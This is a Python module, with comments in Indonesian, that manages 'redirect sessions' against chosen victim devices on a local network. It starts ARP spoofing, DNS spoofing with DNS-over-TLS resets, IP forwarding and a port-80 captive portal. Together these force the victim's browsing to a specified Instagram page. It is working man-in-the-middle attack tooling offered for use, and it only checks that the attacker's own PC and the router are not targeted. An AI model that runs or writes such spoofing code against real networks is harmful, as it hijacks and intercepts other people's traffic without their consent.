#!/usr/bin/env python3
"""
Redirect Session Manager
========================
Mengorkestrasikan sesi redirect per perangkat target:
- ARP Spoofing (dual-opcode L2 routing)
- DNS Spoofing (UDP 53 Walled Garden)
- Captive Portal HTTP Server (TCP 80 302 Redirect)
- Proteksi invariant: Gateway Immunity & Controller Self-Protection
"""

import threading
import time
from typing import Dict, Any, Optional
from ..spoofer import ARPSpoofer
from ..network import (
    get_network_info,
    set_ip_forwarding,
    is_valid_private_ip,
    is_valid_mac,
)
from .dns_spoofer import DNSSpoofer
from .portal_server import CaptivePortalServer
from ...utils.logger import logger
from ...exceptions.custom import SpoofError

class RedirectManager:
    def __init__(self, spoofer: ARPSpoofer):
        self.spoofer = spoofer
        self.portal_server: Optional[CaptivePortalServer] = None
        self._sessions: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()

    def _get_controller_ip_and_mac(self):
        info = get_network_info()
        my_ip = info.get("ip")
        my_mac = self.spoofer._self_mac
        if not my_ip or not my_mac:
            raise SpoofError("Gagal mendeteksi IP/MAC lokal komputer pengawas")
        return my_ip, my_mac

    def start_redirect(
        self,
        victim_ip: str,
        victim_mac: str,
        gateway_ip: str,
        gateway_mac: str,
        redirect_url: str,
        instagram_username: str = ""
    ) -> Dict[str, Any]:
        """Memulai sesi redirect Walled Garden ke akun Instagram untuk target IP."""
        if not is_valid_private_ip(victim_ip):
            raise SpoofError(f"Target IP {victim_ip} di luar jangkauan RFC 1918")
        if not is_valid_mac(victim_mac):
            raise SpoofError(f"Format MAC target '{victim_mac}' tidak valid")
        if not is_valid_private_ip(gateway_ip):
            raise SpoofError(f"Gateway IP {gateway_ip} di luar jangkauan RFC 1918")
        if not is_valid_mac(gateway_mac):
            raise SpoofError(f"Format MAC gateway '{gateway_mac}' tidak valid")

        my_ip, my_mac = self._get_controller_ip_and_mac()
        actual_gateway = get_network_info().get("gateway")
        normalized_victim_mac = victim_mac.lower().replace("-", ":")
        normalized_gateway_mac = gateway_mac.lower().replace("-", ":")
        normalized_self_mac = my_mac.lower().replace("-", ":")

        if victim_ip == my_ip or normalized_victim_mac == normalized_self_mac:
            raise SpoofError("Komputer pengawas (This PC) dilarang menjadi target redirect")
        if (
            victim_ip == gateway_ip
            or victim_ip == actual_gateway
            or normalized_victim_mac == normalized_gateway_mac
        ):
            raise SpoofError("Router Gateway dilarang menjadi target redirect")

        if not redirect_url.startswith("http://") and not redirect_url.startswith("https://"):
            redirect_url = f"https://www.instagram.com/{redirect_url.lstrip('@')}/"

        if not instagram_username and "instagram.com/" in redirect_url:
            parts = redirect_url.rstrip("/").split("instagram.com/")
            if len(parts) > 1:
                instagram_username = parts[1].split("/")[0].split("?")[0]

        with self._lock:
            # Jika sudah ada sesi aktif untuk IP ini, hentikan terlebih dahulu
            if victim_ip in self._sessions:
                self._stop_session_unlocked(victim_ip)

            interface = self.spoofer._interface
            portal_started = False
            arp_session_id = None
            dns_spoofer = None

            try:
                # A. Aktifkan Captive Portal HTTP Server (Port 80) jika belum jalan
                if not self.portal_server or not self.portal_server._running:
                    self.portal_server = CaptivePortalServer(
                        port=80,
                        redirect_url=redirect_url,
                        instagram_username=instagram_username
                    )
                    portal_started = True
                    self.portal_server.start()
                else:
                    self.portal_server.update_target(redirect_url, instagram_username)

                # B. Jalankan ARP Spoofing Kontinu khusus Mode Redirect (is_redirect=True)
                arp_session_id = self.spoofer.start(
                    victim_ip=victim_ip,
                    victim_mac=victim_mac,
                    gateway_ip=gateway_ip,
                    gateway_mac=gateway_mac,
                    speed_limit=0,
                    is_redirect=True
                )

                # C. Pastikan Windows IP Forwarding AKTIF agar trafik Instagram tembus ke gateway
                if not set_ip_forwarding(True, self.spoofer._win_interface_name):
                    raise SpoofError("Gagal mengaktifkan IP forwarding untuk redirect")

                # D. Jalankan DNS Spoofer untuk target IP & MAC (dengan Reactive ARP & DoT Reset)
                dns_spoofer = DNSSpoofer(
                    target_ip=victim_ip,
                    target_mac=victim_mac,
                    controller_ip=my_ip,
                    interface=interface,
                    self_mac=my_mac,
                    gateway_ip=gateway_ip
                )
                dns_spoofer.start()
            except Exception:
                if dns_spoofer is not None:
                    try:
                        dns_spoofer.stop()
                    except Exception as rollback_error:
                        logger.debug(f"Notice rolling back DNS spoofer: {rollback_error}")
                if arp_session_id is not None:
                    try:
                        self.spoofer.stop(arp_session_id)
                    except Exception as rollback_error:
                        logger.debug(f"Notice rolling back ARP session: {rollback_error}")
                if portal_started and self.portal_server is not None:
                    portal = self.portal_server
                    try:
                        portal.stop()
                    except Exception as rollback_error:
                        logger.debug(f"Notice rolling back Portal Server: {rollback_error}")
                    finally:
                        if self.portal_server is portal:
                            self.portal_server = None
                raise

            # Simpan state sesi
            session_data = {
                "victim_ip": victim_ip,
                "victim_mac": victim_mac,
                "gateway_ip": gateway_ip,
                "gateway_mac": gateway_mac,
                "redirect_url": redirect_url,
                "instagram_username": instagram_username,
                "arp_session_id": arp_session_id,
                "dns_spoofer": dns_spoofer,
                "started_at": time.time()
            }
            self._sessions[victim_ip] = session_data

            logger.info(f"✨ [Redirect Manager] Sesi redirect aktif untuk {victim_ip} -> {redirect_url}")

            return {
                "victim_ip": victim_ip,
                "redirect_url": redirect_url,
                "instagram_username": instagram_username,
                "arp_session_id": arp_session_id
            }

    def _stop_session_unlocked(self, victim_ip: str):
        """Hentikan satu sesi tanpa mengambil lock lagi (internal)."""
        session = self._sessions.pop(victim_ip, None)
        if not session:
            return

        # 1. Hentikan DNS Spoofer
        dns = session.get("dns_spoofer")
        if dns:
            try:
                dns.stop()
            except Exception as e:
                logger.debug(f"Notice stopping DNS spoofer: {e}")

        # 2. Hentikan ARP Spoofing
        arp_sid = session.get("arp_session_id")
        if arp_sid:
            try:
                self.spoofer.stop(arp_sid)
            except Exception as e:
                logger.debug(f"Notice stopping ARP session: {e}")

        # 3. Jika tidak ada sesi redirect tersisa, matikan Portal Server port 80
        if len(self._sessions) == 0 and self.portal_server:
            try:
                self.portal_server.stop()
            except Exception as e:
                logger.debug(f"Notice stopping Portal Server: {e}")
            self.portal_server = None

        logger.info(f"🏁 [Redirect Manager] Sesi redirect untuk {victim_ip} dihentikan.")

    def stop_redirect(self, victim_ip: str):
        """Hentikan sesi redirect untuk target IP."""
        with self._lock:
            if victim_ip not in self._sessions:
                logger.warning(f"Sesi redirect {victim_ip} tidak ditemukan.")
                return False
            self._stop_session_unlocked(victim_ip)
            return True

    def stop_all(self):
        """Hentikan semua sesi redirect yang aktif."""
        with self._lock:
            victim_ips = list(self._sessions.keys())
            for ip in victim_ips:
                self._stop_session_unlocked(ip)

    def get_sessions(self) -> Dict[str, Any]:
        """Dapatkan ringkasan seluruh sesi redirect yang aktif."""
        with self._lock:
            result = {}
            for ip, sess in self._sessions.items():
                result[ip] = {
                    "victim_ip": sess["victim_ip"],
                    "victim_mac": sess["victim_mac"],
                    "gateway_ip": sess["gateway_ip"],
                    "redirect_url": sess["redirect_url"],
                    "instagram_username": sess["instagram_username"],
                    "started_at": sess["started_at"]
                }
            return result
